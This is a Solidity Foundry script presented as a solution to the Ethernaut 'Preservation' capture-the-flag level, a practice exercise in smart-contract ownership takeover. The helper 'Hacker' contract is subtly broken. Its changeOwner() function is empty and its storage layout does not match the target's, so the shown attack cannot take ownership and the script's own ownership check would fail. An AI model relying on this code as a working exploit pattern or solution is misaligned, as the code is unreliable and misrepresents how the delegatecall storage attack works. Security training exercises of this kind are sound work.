// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import {Preservation} from "../../challenge-contracts/16-Preservation.sol";

contract PreservationSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x7ae0655F0Ee1e7752D7C62493CEa1E69A810e2ed;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        ////////////////////////////////////////////////////////////////////////////////////
        // Start of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////
        // Step 1: Get Hacker contract;
        Hacker hacker = new Hacker(challengeInstance);

        // Step 2: Call `changeOwner()` function of Hacker contract,
        hacker.changeOwner();

        // Step 3: Confirm that caller `heroAddress` has successfully obtained ownership of the Preservation contract.
        address heroAddress = vm.addr(heroPrivateKey);
        Preservation preservation = Preservation(challengeInstance);
        require(heroAddress == preservation.owner(), "Owner check failed");

        ////////////////////////////////////////////////////////////////////////////////////
        // End of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(16));
    }
}

////////////////////////////////////////////////////////////////////////////////////
// Start of Ric Li C's Solution (Extra Contract)
// Additional contract codes to help solve this puzzle
////////////////////////////////////////////////////////////////////////////////////
contract Hacker {
    address owner;
    address contractAddress;

    constructor(address ctrAddress) {
        contractAddress = ctrAddress;
    }

    function changeOwner() external {}

    function setTime(uint time) external {
        owner = address(uint160(time));
    }
}
////////////////////////////////////////////////////////////////////////////////////
// End of Ric Li C's Solution (Extra Contract)
////////////////////////////////////////////////////////////////////////////////////
